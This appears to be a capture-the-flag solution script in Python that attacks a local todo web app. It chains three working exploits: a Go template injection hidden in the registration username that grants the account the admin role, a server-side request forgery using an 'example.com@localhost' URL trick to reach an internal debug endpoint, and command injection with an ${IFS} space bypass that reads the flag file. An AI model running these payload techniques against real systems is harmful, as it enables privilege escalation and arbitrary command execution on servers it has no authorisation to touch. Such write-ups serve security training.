import httpx

BASE_URL = "http://localhost:1337"
c = httpx.Client(base_url=BASE_URL)

def login(username, password):
    return c.post("/signin", data={"username": username, "password": password})

def register(username, password):
    return c.post("/signup", data={"username": username, "password": password})

def createTodo(title):
    return c.post("/todos", data={"todo": title})

def accessDashboard():
    return c.get("/dashboard")

def fetching(url):
    return c.post("/fetch", data={"url": url})

if __name__ == "__main__":
    username, password = '{{ (index .todos 0).Author.ChangeRole "admin"  }}', "a"
    
    # stage 1
    register(username, password)
    login(username, password)
    createTodo("test")
    accessDashboard()

    # stage 2
    login(username, password)
    r = fetching("http://example.com@localhost:1337/debug?type=system&cmd=cat${IFS}/f*")
    print(r.text)